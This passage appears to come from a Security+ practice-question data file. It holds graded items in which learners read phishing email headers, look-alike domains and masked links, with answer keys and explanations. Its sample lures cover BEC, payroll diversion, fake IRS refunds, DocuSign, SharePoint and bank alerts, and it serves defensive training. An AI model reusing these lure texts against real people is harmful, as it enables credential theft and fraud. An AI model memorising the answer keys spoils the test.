      { label: "What does the passing auth actually prove?", hint: "Domain authenticated vs domain expected", options: ["The CFO truly sent it", "Only that the mail came from corp-cfo.com - a look-alike, not the real corp.com", "Nothing was authenticated", "DKIM failed"], answer: 1, explain: "Auth passes for corp-cfo.com, but the company domain is corp.com. The attacker registered an aligned look-alike so DMARC passes - auth alone does not confirm the CFO." },
      { label: "Is the CFO being impersonated?", hint: "Compare sending domain to the real company", options: ["No, this is her domain", "Yes - the executive's name is on corp-cfo.com, not the corporate corp.com", "No, auth passed", "Unknown"], answer: 1, explain: "Display name plus a freshly registered look-alike domain (corp-cfo.com) impersonates the CFO while passing its own DMARC." },
      { label: "Which body cues signal BEC?", hint: "What pressure tactics appear?", options: ["A friendly greeting", "Urgency, confidentiality ('between us'), and a wire request", "An unsubscribe link", "A meeting agenda"], answer: 1, explain: "Urgency, secrecy, and a request to move money are the classic BEC pressure triad designed to bypass normal controls." },
      { label: "Category of attack", hint: "Executive impersonation for funds", options: ["Generic phishing", "Whaling / CEO-fraud BEC", "Pharming", "Smishing"], answer: 1, explain: "Impersonating a named executive to push a confidential wire is executive-fraud BEC (whaling)." }
    ],
    summary: "DMARC can pass on an attacker-owned look-alike (corp-cfo.com vs corp.com). Urgency plus secrecy plus a wire request is executive-fraud BEC - verify out-of-band."
  },
  {
    id: "PBQ-070",
    format: 3,
    domain: 2,
    title: "Help-Desk Password-Expiry Notice",
    brief: "A user forwarded an email warning that their password expires today and to confirm credentials. Inspect it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <itadmin@<span class='hl'>corp-itservice.net</span>>\nReceived: from smtp1.corp-itservice.net (<span class='hl'>5.188.206.18</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='hl'>fail</span> smtp.mailfrom=corp-itservice.net;\n  dkim=<span class='hl'>none</span>;\n  dmarc=<span class='hl'>fail</span> (p=quarantine)\n<span class='dim'>From:</span> \"IT Help Desk\" <itadmin@<span class='hl'>corp.com</span>>\n<span class='dim'>Reply-To:</span> <itadmin@<span class='hl'>corp-itservice.net</span>>\nMessage-ID: <74aa@corp-itservice.net>\nSubject: Your password expires in 2 hours - act now\n\nTo keep access, <span class='warnc'>verify your current password</span> on the portal:\n<a href='http://corp-itservice.net/reset'>https://portal.corp.com/password</a>",
    fields: [
      { label: "Authentication verdict and meaning", hint: "Note the From vs envelope domains", options: ["All pass", "spf=fail, dkim=none, dmarc=fail - and From (corp.com) is forged over the real corp-itservice.net", "Only SPF fails", "Auth not evaluated"], answer: 1, explain: "Auth fails outright, and the From header forges the trusted corp.com while the envelope/Reply-To reveal the real attacker domain corp-itservice.net." },
      { label: "Is the sender spoofed?", hint: "From vs Return-Path/Reply-To", options: ["No", "Yes - From is forged to corp.com; envelope and Reply-To are corp-itservice.net", "No, IT uses that domain", "Unknown"], answer: 1, explain: "Header-From spoofing displays corp.com to gain trust while every real routing identifier points to the look-alike domain." },
      { label: "Why is asking to 'verify your current password' a tell?", hint: "Legit IT behavior", options: ["IT often emails for passwords", "Legitimate IT never asks you to confirm/enter your existing password via an email link", "It is a normal reset", "It improves security"], answer: 1, explain: "Real IT password resets never require you to type your current password into an emailed link - this is credential harvesting." },
      { label: "Category of attack", hint: "Untargeted IT-themed credential bait", options: ["Whaling", "Generic phishing (credential harvest)", "BEC", "Vishing"], answer: 1, explain: "A broad IT/password-expiry credential lure is generic phishing." }
    ],
    summary: "Header-From forged to corp.com while envelope/Reply-To expose corp-itservice.net; spf/dkim/dmarc all fail. 'Verify your current password' is the credential-harvest tell."
  },
  {
    id: "PBQ-071",
    format: 3,
    domain: 2,
    title: "Voicemail Notification With Vishing Number",
    brief: "A user forwarded a 'new voicemail' email that includes a callback number. Analyze the headers and body.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <voicemail@<span class='hl'>unified-msg-portal.com</span>>\nReceived: from vm3.unified-msg-portal.com (<span class='hl'>45.61.136.7</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='warnc'>softfail</span> smtp.mailfrom=unified-msg-portal.com;\n  dkim=<span class='hl'>fail</span>;\n  dmarc=<span class='hl'>fail</span>\n<span class='dim'>From:</span> \"Voicemail Service\" <voicemail@<span class='hl'>unified-msg-portal.com</span>>\nMessage-ID: <4f7c@unified-msg-portal.com>\nSubject: New voicemail from Accounts Payable (00:48)\n\nYou have a new urgent message regarding a held invoice. <span class='warnc'>Call our support line now: +1-888-555-0142</span> to release payment, or listen:\n<a href='http://unified-msg-portal.com/vm.html'>https://voicemail.corp.com/play</a>",
    fields: [
      { label: "Authentication verdict", hint: "One soft, two hard", options: ["All pass", "SPF softfail, DKIM fail, DMARC fail", "DKIM pass", "Not checked"], answer: 1, explain: "softfail plus dkim=fail plus dmarc=fail leaves the message unauthenticated." },
      { label: "Is the From domain legitimate?", hint: "Compare to corp.com", options: ["Yes", "No - unified-msg-portal.com is an unrelated look-alike, not corp.com", "Yes, auth passed", "Unknown"], answer: 1, explain: "The corporate voicemail system would align with corp.com; unified-msg-portal.com is an external impostor host." },
      { label: "What is the primary lure technique here?", hint: "Look at the callback number", options: ["A masked download", "It pushes a phone callback (+1-888-...) to continue the scam by voice", "A QR code", "An attachment macro"], answer: 1, explain: "The email seeds a phone number so the victim calls the attacker, moving the attack to a live voice (vishing) channel - a callback/vishing follow-up." },
      { label: "Category of attack", hint: "Email that hands off to a phone call", options: ["Pharming", "Vishing follow-up (callback phishing)", "Whaling", "Spear phishing"], answer: 1, explain: "An email designed to get the victim to call a fraud number is a callback/vishing-follow-up (TOAD) attack." }
    ],
    summary: "A look-alike voicemail email with softfail/fail/fail auth seeds a callback number to pivot the victim onto a vishing phone call - a callback (TOAD) attack."
  },
  {
    id: "PBQ-072",
    format: 3,
    domain: 2,
    title: "Payroll Direct-Deposit Change",
    brief: "An employee forwarded an email asking HR/payroll to update their direct-deposit account. Examine it carefully.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <j.morales@<span class='hl'>gmail.com</span>>\nReceived: from mail-sor-f65.google.com (<span class='cy'>209.85.220.65</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='ok'>pass</span> smtp.mailfrom=gmail.com;\n  dkim=<span class='ok'>pass</span> header.d=gmail.com;\n  dmarc=<span class='ok'>pass</span>\n<span class='dim'>From:</span> \"Jordan Morales\" <j.morales@<span class='hl'>gmail.com</span>>\n<span class='dim'>Reply-To:</span> <j.morales.payroll@<span class='hl'>outlook.com</span>>\nMessage-ID: <81bc@mail.gmail.com>\nSubject: Update my direct deposit before this cycle\n\nHi Payroll - I switched banks. Please update my direct deposit to the <span class='warnc'>new account/routing</span> below before Friday's run. New voided check attached.",
    fields: [
      { label: "What does the passing auth indicate?", hint: "Whose domain?", options: ["It is genuinely the employee", "Auth only proves the message came from a gmail.com account, not that it is the real employee", "Auth failed", "DMARC softfail"], answer: 1, explain: "gmail.com auth passing says nothing about whether this account is the actual employee's - it could be an attacker's free-mail account." },
      { label: "Strongest red flag in the headers", hint: "From vs Reply-To providers", options: ["The Message-ID format", "From is a Gmail address but Reply-To is a different Outlook address", "The Received IP", "The subject length"], answer: 1, explain: "An employee suddenly emailing from personal Gmail with replies diverted to a separate Outlook address suggests an impersonator steering the conversation." },
      { label: "Correct response to a deposit-change request like this", hint: "Verification practice", options: ["Update immediately to meet the deadline", "Verify the request out-of-band through a known internal channel before changing anything", "Reply to confirm the routing number", "Forward to all of payroll"], answer: 1, explain: "Direct-deposit/payroll-diversion fraud is defeated by out-of-band verification using the employee's known internal contact, never by trusting the email." },
      { label: "Category of attack", hint: "Targets payroll to redirect pay", options: ["Generic phishing", "Payroll-diversion BEC (employee impersonation)", "Whaling", "Pharming"], answer: 1, explain: "Impersonating an employee to redirect their salary deposit is payroll-diversion BEC." }
    ],
    summary: "Employee-impersonation payroll diversion: passing gmail.com auth is meaningless for identity, and a mismatched Outlook Reply-To gives it away. Verify out-of-band."
  },
  {
    id: "PBQ-073",
    format: 3,
    domain: 2,
    title: "Amazon Order Confirmation Scare",
    brief: "A user forwarded an 'order confirmed' email for a purchase they did not make. Inspect the headers and link.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <auto-confirm@<span class='hl'>amazon-orders-support.com</span>>\nReceived: from ses7.amazon-orders-support.com (<span class='hl'>167.99.40.211</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='hl'>fail</span> smtp.mailfrom=amazon-orders-support.com;\n  dkim=<span class='hl'>none</span>;\n  dmarc=<span class='hl'>fail</span>\n<span class='dim'>From:</span> \"Amazon.com\" <auto-confirm@<span class='hl'>amazon-orders-support.com</span>>\n<span class='dim'>Reply-To:</span> <cancel@<span class='hl'>amzn-helpcenter.co</span>>\nMessage-ID: <19fb@amazon-orders-support.com>\nSubject: Order confirmed: MacBook Pro $2,399.00 - charged today\n\nWe charged your card $2,399.00. If you did not authorize this, <span class='warnc'>cancel immediately</span>:\n<a href='http://amzn-helpcenter.co/cancel'>https://www.amazon.com/orders</a>",
    fields: [
      { label: "Authentication summary", hint: "Three verdicts", options: ["All pass", "spf=fail, dkim=none, dmarc=fail", "Only SPF passes", "softfail only"], answer: 1, explain: "No SPF authorization, no DKIM signature, and dmarc=fail - the sender is unverified." },
      { label: "Identify the look-alike domain(s)", hint: "Real brand is amazon.com", options: ["amazon.com", "amazon-orders-support.com and amzn-helpcenter.co", "corp.com", "mx.corp.com"], answer: 1, explain: "Both amazon-orders-support.com (From) and amzn-helpcenter.co (Reply-To) are unaffiliated look-alikes of amazon.com." },
      { label: "Why is the 'cancel' link dangerous?", hint: "Anchor vs href, and what the page wants", options: ["It uses HTTPS", "Anchor shows amazon.com but href is amzn-helpcenter.co, leading to a fake cancel/credential page", "It links to corp.com", "There is no link"], answer: 1, explain: "The masked link routes the panicked user to an attacker page that harvests login/payment details under the guise of canceling the bogus charge." },
      { label: "Category of attack", hint: "Mass fake-order panic bait", options: ["Whaling", "Generic phishing (fake-order panic)", "BEC", "Spear phishing"], answer: 1, explain: "A broadly sent fake-order-confirmation that panics users into clicking is generic phishing (a 'reverse' or callback-style lure)." }
    ],
    summary: "Fake $2,399 order panic with spf=fail/dkim=none/dmarc=fail, two amazon look-alike domains, and a masked 'cancel' link to a credential page - generic phishing."
  },
  {
    id: "PBQ-074",
    format: 3,
    domain: 2,
    title: "Board-Member Confidential Document",
    brief: "An executive assistant forwarded an email to a board member referencing an upcoming confidential board vote. Review it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <chair@<span class='hl'>corp-board-office.com</span>>\nReceived: from mx2.corp-board-office.com (<span class='hl'>146.70.124.9</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='ok'>pass</span> smtp.mailfrom=corp-board-office.com;\n  dkim=<span class='ok'>pass</span> header.d=corp-board-office.com;\n  dmarc=<span class='hl'>fail</span> (From misaligned)\n<span class='dim'>From:</span> \"Eleanor Vance, Board Chair\" <chair@<span class='hl'>corp.com</span>>\n<span class='dim'>Reply-To:</span> <chair.vance@<span class='hl'>corp-board-office.com</span>>\nMessage-ID: <a3f1@corp-board-office.com>\nSubject: Confidential - review merger resolution before the vote\n\nEleanor here. Ahead of Thursday's vote, please <span class='warnc'>review the sealed resolution</span> and sign in to acknowledge. Keep this off the normal channels.\n<a href='http://corp-board-office.com/board'>https://board.corp.com/resolution</a>",
    fields: [
      { label: "Why DMARC fail despite SPF/DKIM pass?", hint: "Alignment with From", options: ["DMARC was skipped", "Auth passes for corp-board-office.com but From claims corp.com - misalignment fails DMARC", "DKIM truly failed", "SPF is missing"], answer: 1, explain: "The authenticated domain (corp-board-office.com) does not align with the From domain (corp.com), so DMARC fails even though SPF and DKIM individually pass." },
      { label: "Is the board chair impersonated?", hint: "From vs real routing", options: ["No, it is her office", "Yes - From is forged to corp.com while the real domain is the look-alike corp-board-office.com", "No, auth passed", "Unknown"], answer: 1, explain: "Header-From spoofing places the chair's name on corp.com while the envelope, Reply-To and links all point to the attacker's look-alike domain." },
      { label: "What identifies this as whaling specifically?", hint: "Who is targeted and impersonated?", options: ["It is sent to many users", "It impersonates a senior leader and targets a high-value board member with confidential, high-stakes content", "It contains a coupon", "It is a newsletter"], answer: 1, explain: "Targeting a board member by impersonating the Board Chair around a confidential merger vote is high-value executive targeting - whaling." },
      { label: "The 'keep this off the normal channels' line is meant to", hint: "What does it prevent?", options: ["Improve privacy", "Suppress out-of-band verification so the victim cannot confirm authenticity", "Comply with policy", "Reduce spam"], answer: 1, explain: "Discouraging use of normal/verifiable channels is a control-bypass tactic to stop the victim from confirming the request is real." }
    ],
    summary: "Whaling: From spoofed to corp.com (DMARC fails on alignment vs look-alike corp-board-office.com), confidential board-vote pretext, and a 'stay off normal channels' line to block verification."
  },
  {
    id: "PBQ-075",
    format: 3,
    domain: 2,
    title: "DNS-Hijack Bank Login (Pharming Follow-Up)",
    brief: "After reports of a DNS issue, a user forwarded an email telling them to re-confirm bank details at a 'secured' link. Analyze it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <security@<span class='hl'>onlinebanking-secure.com</span>>\nReceived: from edge1.onlinebanking-secure.com (<span class='hl'>185.156.73.54</span>) by mx.corp.com\nReceived: from [<span class='hl'>91.92.240.10</span>] by edge1.onlinebanking-secure.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='hl'>fail</span> smtp.mailfrom=onlinebanking-secure.com;\n  dkim=<span class='hl'>fail</span>;\n  dmarc=<span class='hl'>fail</span>\n<span class='dim'>From:</span> \"Online Banking Security\" <security@<span class='hl'>onlinebanking-secure.com</span>>\n<span class='dim'>Reply-To:</span> <noreply@<span class='hl'>onlinebanking-secure.com</span>>\nMessage-ID: <b22e@onlinebanking-secure.com>\nSubject: DNS maintenance - re-confirm your login at the new secure address\n\nDue to recent DNS maintenance, please access banking only via our <span class='warnc'>new secure address</span> and re-enter your credentials:\n<a href='http://onlinebanking-secure.com/login'>https://www.firstbank.com/login</a>",
    fields: [
      { label: "Authentication verdict", hint: "All three", options: ["All pass", "spf=fail, dkim=fail, dmarc=fail - fully unauthenticated", "Only DKIM passes", "softfail"], answer: 1, explain: "Every check fails, so nothing about this sender is verified or aligned with any legitimate bank." },
      { label: "Identify the malicious domain", hint: "Generic 'secure' wrapper around banking", options: ["firstbank.com", "onlinebanking-secure.com", "corp.com", "mx.corp.com"], answer: 1, explain: "firstbank.com is the real bank; onlinebanking-secure.com is a generic-sounding look-alike used to host the fake login." },
      { label: "Why does the email reference 'DNS maintenance'?", hint: "What technique is it impersonating?", options: ["To explain a coupon", "To make a redirect to a fake site seem legitimate, mimicking/abusing a pharming theme", "To schedule a call", "To attach a file"], answer: 1, explain: "Invoking DNS changes provides a pretext for sending users to a new (attacker) address - leveraging the pharming concept of redirecting victims to a fraudulent site." },
      { label: "What is the danger in the link?", hint: "Anchor vs href", options: ["It is HTTPS so it is safe", "Anchor shows firstbank.com but href points to onlinebanking-secure.com", "It links internally", "There is no anchor"], answer: 1, explain: "The visible URL impersonates the real bank login while the href delivers the victim to the attacker-controlled look-alike credential page." },
      { label: "Category of attack", hint: "Email that primes a redirect to a fake site", options: ["Whaling", "Pharming-themed phishing (redirect to a fraudulent bank site)", "BEC", "Vishing"], answer: 1, explain: "Using a DNS/redirect pretext to drive users to a fraudulent banking site to harvest credentials is a pharming-style phishing attack." }
    ],
    summary: "A 'DNS maintenance' pretext (pharming theme) with all-fail auth and a masked link drives the victim to a look-alike onlinebanking-secure.com login to steal banking credentials."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-076",
    format: 3,
    domain: 2,
    title: "IRS Tax Refund Notification",
    brief: "A user forwards an email claiming they are owed a tax refund and must \"confirm banking details.\" Analyze the headers and classify the threat.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <refunds@irs-refund-portal.com>\nReceived: from mail.irs-refund-portal.com (unknown [185.220.101.47])\n\tby mx.corp.example.com with ESMTP id 4A2F9C; Mon, 22 Jun 2026 09:14:02 -0400\nReceived: from web03.bulkhost.ru (web03.bulkhost.ru [91.241.19.84])\n\tby mail.irs-refund-portal.com; Mon, 22 Jun 2026 13:13:58 +0000\nFrom: \"IRS Refund Department\" <noreply@irs.gov>\nReply-To: <refunds@irs-refund-portal.com>\nTo: <jsmith@corp.example.com>\nMessage-ID: <a91f@irs-refund-portal.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail (sender IP is 185.220.101.47) smtp.mailfrom=irs-refund-portal.com;\n\tdkim=none;\n\tdmarc=fail action=quarantine header.from=irs.gov\nSubject: Your 2025 Federal Refund of $1,842.00 is Pending\n\n--- BODY ---\nOur records show a refund is owed to you. To release funds within 24 hours, verify your bank account now:\n<a href='http://irs-refund-portal.com/verify?id=8841'>https://www.irs.gov/refunds</a>",
    fields: [
      {
        label: "SPF evaluation result",
        hint: "Read the Authentication-Results line.",
        options: ["spf=pass", "spf=fail", "spf=neutral", "spf=softfail"],
        answer: 1,
        explain: "Authentication-Results shows <span class='hl'>spf=fail</span> because the sending IP <span class='cy'>185.220.101.47</span> is not authorized for the envelope domain."
      },
      {
        label: "Is the From address spoofed?",
        hint: "Compare header.from with DMARC and the Reply-To path.",
        options: ["No, legitimately from irs.gov", "Yes, From claims irs.gov but DMARC failed", "Cannot be determined", "Only the subject is spoofed"],
        answer: 1,
        explain: "The From displays <span class='cy'>noreply@irs.gov</span> but <span class='hl'>dmarc=fail header.from=irs.gov</span> with replies redirected to <span class='hl'>irs-refund-portal.com</span> — classic display/domain spoofing."
      },
      {
        label: "The deceptive link anchor text shows irs.gov but the href points to:",
        hint: "Inspect the href attribute, not the visible text.",
        options: ["https://www.irs.gov/refunds", "http://irs-refund-portal.com/verify", "mailto:refunds@irs.gov", "an internal corp link"],
        answer: 1,
        explain: "The anchor displays the real IRS URL but the <span class='hl'>href</span> resolves to <span class='hl'>irs-refund-portal.com</span> — a mismatched, malicious destination."
      },
      {
        label: "Best classification of this attack vector",
        hint: "Mass-sent, government-impersonation lure.",
        options: ["Whaling", "Business email compromise", "Phishing", "Watering-hole attack"],
        answer: 2,
        explain: "A broad, untargeted government-impersonation message harvesting credentials/bank data is <span class='warnc'>phishing</span>, not a targeted whaling or BEC attack."
      }
    ],
    summary: "Government-impersonation phishing: spf=fail, dmarc=fail, Reply-To divergence to a lookalike domain, and an anchor/href mismatch."
  },
  {
    id: "PBQ-077",
    format: 3,
    domain: 2,
    title: "DocuSign E-Signature Lure",
    brief: "An employee receives a \"document awaiting signature\" email. Evaluate authentication and link safety.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <dse@docu-sign-secure.net>\nReceived: from edge.docu-sign-secure.net (edge.docu-sign-secure.net [45.142.212.9])\n\tby mx.corp.example.com with ESMTP; Tue, 23 Jun 2026 11:02:41 -0400\nFrom: \"DocuSign\" <dse@docusign.net>\nReply-To: \"DocuSign\" <dse@docu-sign-secure.net>\nTo: <apayne@corp.example.com>\nMessage-ID: <77c1@docu-sign-secure.net>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=docu-sign-secure.net;\n\tdkim=fail (body hash mismatch) header.d=docusign.net;\n\tdmarc=fail action=reject header.from=docusign.net\nSubject: Completed: Please DocuSign \"Q2_Vendor_Agreement.pdf\"\n\n--- BODY ---\nYou have a document waiting. Review and sign:\n<a href='http://docu-sign-secure.net/login.php?u=apayne'>REVIEW DOCUMENT</a>",
    fields: [
      {
        label: "DKIM evaluation result",
        hint: "Look at the dkim token.",
        options: ["dkim=pass", "dkim=none", "dkim=fail", "dkim=temperror"],
        answer: 2,
        explain: "<span class='hl'>dkim=fail</span> with a body-hash mismatch indicates the signature does not validate for header.d=docusign.net."
      },
      {
        label: "Which domain is the look-alike (typosquatted) domain?",
        hint: "Compare to the legitimate brand domain docusign.net.",
        options: ["docusign.net", "docu-sign-secure.net", "corp.example.com", "mx.corp.example.com"],
        answer: 1,
        explain: "<span class='hl'>docu-sign-secure.net</span> mimics the brand with hyphens and an extra word; the real domain is <span class='ok'>docusign.net</span>."
      },
      {
        label: "DMARC policy action requested by the real domain",
        hint: "Read action= in the dmarc result.",
        options: ["action=none", "action=quarantine", "action=reject", "no policy published"],
        answer: 2,
        explain: "The legitimate domain publishes <span class='ok'>action=reject</span>, so this failing message should be rejected outright."
      },
      {
        label: "Is the sender spoofed?",
        hint: "All three auth checks plus Reply-To.",
        options: ["No, fully authenticated", "Yes, all of SPF/DKIM/DMARC failed", "Partially, only DKIM passed", "Cannot tell"],
        answer: 1,
        explain: "<span class='hl'>spf=fail</span>, <span class='hl'>dkim=fail</span>, and <span class='hl'>dmarc=fail</span> with a divergent Reply-To confirm spoofing of docusign.net."
      },
      {
        label: "Primary classification",
        hint: "Brand-impersonation, credential-harvest login page.",
        options: ["Phishing", "Pharming", "Vishing", "Tailgating"],
        answer: 0,
        explain: "A spoofed brand email driving to a fake <span class='cy'>login.php</span> is credential-harvesting <span class='warnc'>phishing</span>."
      }
    ],
    summary: "DocuSign-brand phishing with triple auth failure (SPF/DKIM/DMARC=fail), a hyphenated lookalike domain, and a credential-harvest login link."
  },
  {
    id: "PBQ-078",
    format: 3,
    domain: 2,
    title: "Voicemail Notification Attachment",
    brief: "A \"new voicemail\" email arrives with an HTML attachment and a playback link. Determine whether it is legitimate.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <voice@unified-msg-relay.com>\nReceived: from relay7.unified-msg-relay.com (relay7.unified-msg-relay.com [193.34.144.22])\n\tby mx.corp.example.com with ESMTP; Wed, 24 Jun 2026 07:48:10 -0400\nReceived: from localhost (10.0.0.5) by relay7.unified-msg-relay.com; Wed, 24 Jun 2026 11:48:05 +0000\nFrom: \"Voicemail Service\" <voicemail@corp.example.com>\nReply-To: <voice@unified-msg-relay.com>\nTo: <dlin@corp.example.com>\nMessage-ID: <vm5521@unified-msg-relay.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=softfail smtp.mailfrom=unified-msg-relay.com;\n\tdkim=none;\n\tdmarc=fail header.from=corp.example.com\nSubject: New Voicemail (0:42) from +1 (212) 555-0148\n\n--- BODY ---\nYou received a new voice message. Click to listen:\n<a href='https://unified-msg-relay.com/play?m=vm5521'>Play Message (00:42)</a>",
    fields: [
      {
        label: "SPF result for this message",
        hint: "The token directly follows spf=.",
        options: ["spf=pass", "spf=softfail", "spf=fail", "spf=none"],
        answer: 1,
        explain: "<span class='warnc'>spf=softfail</span> means the domain owner weakly disallows this IP — suspicious but not a hard fail."
      },
      {
        label: "Why is the From especially deceptive here?",
        hint: "Compare the From domain with the recipient's own domain.",
        options: ["It uses a foreign TLD", "It impersonates the recipient's own internal domain", "It is a no-reply address", "It matches the Return-Path"],
        answer: 1,
        explain: "The From spoofs <span class='hl'>voicemail@corp.example.com</span> — the recipient's own domain — yet <span class='hl'>dmarc=fail header.from=corp.example.com</span> proves it did not originate internally."
      },
      {
        label: "The Received chain shows the message actually originated from:",
        hint: "Trace the earliest external Received hop.",
        options: ["mx.corp.example.com", "an internal 10.x host inside corp", "relay7.unified-msg-relay.com (193.34.144.22)", "Microsoft 365"],
        answer: 2,
        explain: "The external hop is <span class='cy'>relay7.unified-msg-relay.com [193.34.144.22]</span>; the 10.0.0.5 \"localhost\" hop is internal to the attacker relay, not corp."
      },
      {
        label: "Most accurate vector classification",
        hint: "Untargeted brand/service-impersonation email.",
        options: ["Whaling", "Phishing", "Smishing", "Spear phishing"],
        answer: 1,
        explain: "A generic voicemail-notification lure spoofing the internal domain is mass <span class='warnc'>phishing</span> (smishing would be SMS-based)."
      }
    ],
    summary: "Voicemail-notification phishing spoofing the recipient's own domain; spf=softfail, dmarc=fail, and the true origin is an external relay."
  },
  {
    id: "PBQ-079",
    format: 3,
    domain: 2,
    title: "Cloud Storage File Share",
    brief: "A \"someone shared a file with you\" message references SharePoint. Verify the headers before opening.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <share@sharepoint-files.cloud>\nReceived: from out.sharepoint-files.cloud (out.sharepoint-files.cloud [104.21.7.190])\n\tby mx.corp.example.com with ESMTP; Thu, 25 Jun 2026 14:21:33 -0400\nFrom: \"Microsoft SharePoint\" <no-reply@sharepointonline.com>\nReply-To: <share@sharepoint-files.cloud>\nTo: <mgarcia@corp.example.com>\nMessage-ID: <shr88@sharepoint-files.cloud>\nAuthentication-Results: mx.corp.example.com;\n\tspf=pass smtp.mailfrom=sharepoint-files.cloud;\n\tdkim=pass header.d=sharepoint-files.cloud;\n\tdmarc=fail header.from=sharepointonline.com\nSubject: T. Wallace shared \"2026_Budget_Forecast.xlsx\" with you\n\n--- BODY ---\nA file has been shared with you on SharePoint.\n<a href='https://sharepoint-files.cloud/auth/o365.htm'>Open in SharePoint</a>",
    fields: [
      {
        label: "Why does DMARC fail even though SPF and DKIM pass?",
        hint: "DMARC requires alignment with the From (header.from) domain.",
        options: ["The DKIM key expired", "SPF/DKIM authenticated a different domain than header.from (no alignment)", "The recipient blocked the sender", "The Message-ID is malformed"],
        answer: 1,
        explain: "SPF/DKIM both pass for <span class='cy'>sharepoint-files.cloud</span>, but header.from is <span class='hl'>sharepointonline.com</span>. With no alignment, <span class='hl'>dmarc=fail</span> — auth pass does not equal trustworthy."
      },
      {
        label: "Identify the look-alike domain impersonating Microsoft",
        hint: "Microsoft's real tenant domain ends in a known suffix.",
        options: ["sharepointonline.com", "sharepoint-files.cloud", "corp.example.com", "mx.corp.example.com"],
        answer: 1,
        explain: "<span class='hl'>sharepoint-files.cloud</span> is the attacker-controlled lookalike that actually sent and signed the mail; the From merely displays the real-looking sharepointonline.com."
      },
      {
        label: "The link destination o365.htm most likely is a:",
        hint: "Static .htm page mimicking a Microsoft login.",
        options: ["Legitimate Office 365 portal", "Fake Office 365 credential-capture page", "PDF viewer", "Calendar invite"],
        answer: 1,
        explain: "A standalone <span class='hl'>o365.htm</span> on the lookalike domain is a cloned <span class='warnc'>credential-capture</span> page."
      },
      {
        label: "Classification",
        hint: "Brand impersonation harvesting cloud credentials.",
        options: ["Pharming", "Phishing", "BEC", "Whaling"],
        answer: 1,
        explain: "This is brand-impersonation <span class='warnc'>phishing</span>; note that SPF/DKIM <span class='ok'>pass</span> alone never proves legitimacy without DMARC alignment."
      }
    ],
    summary: "Teachable case: SPF/DKIM pass but DMARC fails on alignment. Lookalike sharepoint-files.cloud spoofs Microsoft to harvest O365 credentials."
  },
  {
    id: "PBQ-080",
    format: 3,
    domain: 2,
    title: "Bank Fraud Alert",
    brief: "A customer-style \"unusual activity\" alert appears to come from the user's bank. Assess legitimacy.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <alerts@secure-firstnationa1.com>\nReceived: from mx1.secure-firstnationa1.com (mx1.secure-firstnationa1.com [198.51.100.77])\n\tby mx.corp.example.com with ESMTP; Fri, 26 Jun 2026 08:05:19 -0400\nFrom: \"First National Bank Security\" <alerts@firstnational.com>\nReply-To: <alerts@secure-firstnationa1.com>\nTo: <rkhan@corp.example.com>\nMessage-ID: <bk0091@secure-firstnationa1.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=secure-firstnationa1.com;\n\tdkim=none;\n\tdmarc=fail action=quarantine header.from=firstnational.com\nSubject: ALERT: Suspicious sign-in to your account - action required\n\n--- BODY ---\nWe detected a login from a new device. If this was not you, secure your account immediately:\n<a href='http://secure-firstnationa1.com/unlock'>https://firstnational.com/account/secure</a>",
    fields: [
      {
        label: "What homoglyph/typosquat trick is used in the sending domain?",
        hint: "Look closely at firstnationa1.com.",
        options: ["Extra subdomain", "The digit 1 replaces the letter l (firstnationa1)", "Unicode emoji", "Doubled TLD"],
        answer: 1,
        explain: "<span class='hl'>secure-firstnationa1.com</span> swaps the lowercase L for the digit <span class='hl'>1</span> — a classic homoglyph typosquat of firstnational.com."
      },
      {
        label: "SPF and DKIM combined result",
        hint: "Read both tokens.",
        options: ["Both pass", "SPF fail, DKIM absent", "SPF pass, DKIM fail", "Both neutral"],
        answer: 1,
        explain: "<span class='hl'>spf=fail</span> and <span class='hl'>dkim=none</span> — no valid authentication at all."
      },
      {
        label: "The anchor text shows firstnational.com but the href is:",
        hint: "Compare visible text to the href.",
        options: ["https://firstnational.com/account/secure", "http://secure-firstnationa1.com/unlock", "an internal corp URL", "a mailto link"],
        answer: 1,
        explain: "Visible text mimics the real bank URL, but the <span class='hl'>href</span> points to the typosquat <span class='hl'>secure-firstnationa1.com/unlock</span>."
      },
      {
        label: "Classification",
        hint: "Urgency-driven mass financial impersonation.",
        options: ["Spear phishing", "Phishing", "Pharming", "Smishing"],
        answer: 1,
        explain: "An urgent, untargeted bank-impersonation credential lure is <span class='warnc'>phishing</span>; the urgency cue (\"action required\") is a social-engineering principle."
      }
    ],
    summary: "Bank fraud-alert phishing using a digit-for-letter homoglyph domain; spf=fail/dkim=none, Reply-To divergence, and anchor/href mismatch."
  },
  {
    id: "PBQ-081",
    format: 3,
    domain: 2,
    title: "Recruiter Job Offer",
    brief: "An unsolicited \"job opportunity\" email targets an engineer by name and references their employer. Evaluate it.",
    exhibitTitle: "message headers",
